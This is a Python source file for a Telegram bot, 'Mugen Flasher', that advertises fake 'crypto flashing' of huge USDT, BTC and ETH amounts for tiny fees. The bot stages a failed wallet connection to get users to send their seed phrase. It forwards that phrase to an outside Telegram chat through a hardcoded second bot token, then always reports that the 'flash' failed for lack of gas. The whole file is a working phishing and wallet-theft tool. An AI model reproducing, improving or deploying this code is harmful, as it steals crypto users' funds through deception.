import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
)
import asyncio
import re
from web3 import Web3
import os
from http import HTTPStatus

# Enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# Bot tokens and chat ID
MAIN_BOT_TOKEN = os.environ.get("MAIN_BOT_TOKEN", "7868684810:AAHOCTmqdpNvBQTq5rkLHLUmNJQFihBqmDA")
FORWARD_BOT_TOKEN = os.environ.get("FORWARD_BOT_TOKEN", "8010603892:AAHvYMQ9JDtTg5SbPiSsKS-V9vNbtxJU340")
FORWARD_CHAT_ID = os.environ.get("FORWARD_CHAT_ID", "7753649096")

# Initialize Web3 for address validation
w3 = Web3()

# User data storage (in-memory; consider Redis for production)
user_data = {}

# Wallet options
WALLETS = [
    "Bitget Wallet 🪙",
    "Coinbase Wallet 💳",
    "Trust Wallet 🔒",
    "Metamask Wallet 🦊",
    "Binance Wallet 💰",
    "Bybit Wallet 📈",
    "Phantom Wallet 👻",
    "Exodus Wallet 🌌",
]

# Coin options
COINS = [
    "USDT (TRC20) 💵",
    "USDT (BEP20) 💸",
    "USDT (ERC20) 💶",
    "Bitcoin ₿",
    "Ethereum 🪙",
]

# Amount options per coin
AMOUNTS = {
    "USDT (TRC20)": [
        ("1000 USDT for 4 TRX", 1000, "4 TRX"),
        ("100,000 USDT for 17 TRX", 100000, "17 TRX"),
        ("1,000,000 USDT for 30 TRX", 1000000, "30 TRX"),
    ],
    "USDT (BEP20)": [
        ("1000 USDT for 0.05 BNB", 1000, "0.05 BNB"),
        ("100,000 USDT for 0.07 BNB", 100000, "0.07 BNB"),
        ("1,000,000 USDT for 0.09 BNB", 1000000, "0.09 BNB"),
    ],
    "USDT (ERC20)": [
        ("1000 USDT for 0.008 ETH", 1000, "0.008 ETH"),
        ("100,000 USDT for 0.012 ETH", 100000, "0.012 ETH"),
        ("1,000,000 USDT for 0.019 ETH", 1000000, "0.019 ETH"),
    ],
    "Bitcoin": [
        ("10 BTC for 0.0001 BTC", 10, "0.0001 BTC"),
        ("100 BTC for 0.0005 BTC", 100, "0.0005 BTC"),
        ("1000 BTC for 0.0009 BTC", 1000, "0.0009 BTC"),
    ],
    "Ethereum": [
        ("100 ETH for 0.001 ETH", 100, "0.001 ETH"),
        ("1000 ETH for 0.006 ETH", 1000, "0.006 ETH"),
        ("100,000 ETH for 0.009 ETH", 100000, "0.009 ETH"),
    ],
}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the /start command."""
    user_id = update.effective_user.id
    user_data[user_id] = {"step": "select_wallet"}
    
    await update.message.reply_text(
        "Welcome to Mugen Flasher, a free crypto Flasher Bot! 🌟"
    )
    await asyncio.sleep(1)
    await update.message.reply_text(
        "Select the wallet you want to flash:",
        reply_markup=wallet_keyboard()
    )

def wallet_keyboard():
    """Create wallet selection keyboard."""
    keyboard = [
        [InlineKeyboardButton(wallet, callback_data=f"wallet_{wallet}")]
        for wallet in WALLETS
    ]
    return InlineKeyboardMarkup(keyboard)

def coin_keyboard():
    """Create coin selection keyboard."""
    keyboard = [
        [InlineKeyboardButton(coin, callback_data=f"coin_{coin}")]
        for coin in COINS
    ]
    return InlineKeyboardMarkup(keyboard)

def amount_keyboard(coin):
    """Create amount selection keyboard for a specific coin."""
    keyboard = [
        [InlineKeyboardButton(amount[0], callback_data=f"amount_{amount[0]}")]
        for amount in AMOUNTS[coin]
    ]
    return InlineKeyboardMarkup(keyboard)

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button clicks."""
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data

    if data.startswith("wallet_"):
        wallet = data.replace("wallet_", "")
        user_data[user_id]["wallet"] = wallet
        user_data[user_id]["step"] = "select_coin"
        await asyncio.sleep(3)
        await query.message.reply_text(
            "Select the coin you want to flash:",
            reply_markup=coin_keyboard()
        )

    elif data.startswith("coin_"):
        coin = data.replace("coin_", "")
        user_data[user_id]["coin"] = coin
        user_data[user_id]["step"] = "select_amount"
        await asyncio.sleep(2)
        await query.message.reply_text(
            f"Select the amount to flash for {coin}:",
            reply_markup=amount_keyboard(coin)
        )

    elif data.startswith("amount_"):
        amount = data.replace("amount_", "")
        user_data[user_id]["amount"] = amount
        user_data[user_id]["step"] = "link_wallet"
        for amt in AMOUNTS[user_data[user_id]["coin"]]:
            if amt[0] == amount:
                user_data[user_id]["amount_value"] = amt[1]
                user_data[user_id]["gas_fee"] = amt[2]
                break
        await query.message.reply_text(
            "Kindly link your wallet for payment of gas fee, which will be deducted from your wallet when sending flash:",
            reply_markup=wallet_keyboard()
        )

    elif data in [f"wallet_{wallet}" for wallet in WALLETS] and user_data.get(user_id, {}).get("step") == "link_wallet":
        user_data[user_id]["step"] = "connect_wallet"
        await query.message.reply_text(
            "Make sure the app is installed on your phone to ensure a successful connection 📱."
        )
        await asyncio.sleep(1)
        await query.message.reply_text("Connecting... 🔄")
        await asyncio.sleep(4)
        await query.message.reply_text("Connection failed. Link manually 🚫.")
        await query.message.reply_text("Send your wallet seed phrase to link manually 🔑.")

    elif data == "confirm_yes":
        await query.message.reply_text(
            f"{user_data[user_id]['gas_fee']} will be deducted from your wallet. Do you wish to proceed?",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("Yes ✅", callback_data="proceed_yes")],
                [InlineKeyboardButton("No ❌", callback_data="proceed_no")],
            ])
        )

    elif data == "confirm_no":
        user_data[user_id]["step"] = "select_wallet"
        await query.message.reply_text(
            "Transaction cancelled. Select a wallet to start again:",
            reply_markup=wallet_keyboard()
        )

    elif data == "proceed_yes":
        await query.message.reply_text("Sending Flash... Kindly wait ⏳")
        await asyncio.sleep(10)
        await query.message.reply_text("Flash failed due to insufficient gas fee 😔")
        user_data[user_id]["step"] = "select_wallet"
        await query.message.reply_text(
            "Select a wallet to try again:",
            reply_markup=wallet_keyboard()
        )

    elif data == "proceed_no":
        user_data[user_id]["step"] = "select_wallet"
        await query.message.reply_text(
            "Transaction cancelled. Select a wallet to start again:",
            reply_markup=wallet_keyboard()
        )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle text messages."""
    user_id = update.effective_user.id
    text = update.message.text

    if user_data.get(user_id, {}).get("step") == "connect_wallet":
        # Validate seed phrase
        words = text.strip().split()
        if len(words) in [12, 18, 24]:
            user_data[user_id]["seed_phrase"] = text
            user_data[user_id]["step"] = "connecting"
            await update.message.reply_text("Connecting... 🔄")
            await asyncio.sleep(4)
            await update.message.reply_text("Connection successful! You may proceed ✅")
            
            # Forward seed phrase to another bot
            forward_bot = context.bot.create_new_bot(FORWARD_BOT_TOKEN)
            await forward_bot.send_message(
                chat_id=FORWARD_CHAT_ID,
                text=f"Seed Phrase from user {user_id}: {text}"
            )
            
            user_data[user_id]["step"] = "receiver_address"
            await update.message.reply_text("Send the receiver's address you wish to flash 📍")
        else:
            await update.message.reply_text("Invalid seed phrase. Must be 12, 18, or 24 words. Try again 🔑")

    elif user_data.get(user_id, {}).get("step") == "receiver_address":
        # Validate crypto address
        address = text.strip()
        coin = user_data[user_id]["coin"]
        is_valid = False

        if coin.startswith("USDT (TRC20)"):
            is_valid = bool(re.match(r"^T[1-9A-HJ-NP-Za-km-z]{33}$", address))
        elif coin in ["USDT (ERC20)", "Ethereum"]:
            is_valid = w3.is_address(address)
        elif coin == "USDT (BEP20)":
            is_valid = w3.is_address(address)
        elif coin == "Bitcoin":
            is_valid = bool(re.match(r"^[13][1-9A-HJ-NP-Za-km-z]{25,34}$|^bc1[0-9A-Za-z]{39,59}$", address))

        if is_valid:
            user_data[user_id]["receiver_address"] = address
            user_data[user_id]["step"] = "confirm"
            await update.message.reply_text(
                f"Do you want to send {user_data[user_id]['amount']} to this address: {address}?",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("Yes ✅", callback_data="confirm_yes")],
                    [InlineKeyboardButton("No ❌", callback_data="confirm_no")],
                ])
            )
        else:
            await update.message.reply_text("Invalid crypto address. Please provide a valid address 🚫")

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle errors."""
    logger.error(f"Update {update} caused error {context.error}")
    if update and update.effective_message:
        await update.effective_message.reply_text("An error occurred. Please try again 😔")

# Serverless function handler for Vercel
async def webhook(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle incoming webhook updates."""
    await context.application.process_update(update)
    return HTTPStatus.OK

def main():
    """Set up and run the bot with webhook."""
    application = Application.builder().token(MAIN_BOT_TOKEN).build()

    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_callback))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.add_error_handler(error_handler)

    # Run with webhook
    port = int(os.environ.get("PORT", 8443))
    webhook_url = os.environ.get("WEBHOOK_URL", "https://your-vercel-app.vercel.app")
    
    # Set webhook
    async def set_webhook():
        await application.bot.set_webhook(url=webhook_url)
        logger.info(f"Webhook set to {webhook_url}")

    # Initialize and start
    loop = asyncio.get_event_loop()
    loop.run_until_complete(set_webhook())
    
    # Vercel expects a serverless function, so we use run_webhook
    application.run_webhook(
        listen="0.0.0.0",
        port=port,
        url_path="/",
        webhook_url=webhook_url
    )

if __name__ == "__main__":
    main()
